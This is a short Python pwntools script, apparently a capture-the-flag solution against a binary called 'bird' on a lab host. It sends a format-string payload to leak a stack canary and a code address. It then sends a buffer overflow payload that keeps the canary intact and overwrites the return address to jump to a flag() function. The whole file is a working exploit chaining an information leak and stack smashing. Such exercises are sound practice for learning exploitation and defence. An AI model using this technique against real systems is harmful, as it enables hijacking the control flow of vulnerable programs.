from pwn import *
import sys
#p = process('./bird')
#10.9.8.1 5011
p = remote('10.9.8.1',5011)
p.readuntil(b': ')
p.send(b'%23$p %24$p\n')
line = p.readline()
print(line)
canary,addr = line.split()
canary = int(canary, 16)
addr = int(addr, 16)
addr = addr - 0x19b # Difference between leaked stack address and flag()
print("canary:",hex(canary))
print("flag() addr:",hex(addr))
print(p.readuntil(b': '))
p.send(b'A'*136+p64(canary)+b'A'*8+p64(addr)+b'\n')
try:
    print(p.readline()) # Thanks
    print(p.readline()) # flag
except EOFError:
    print("eof")
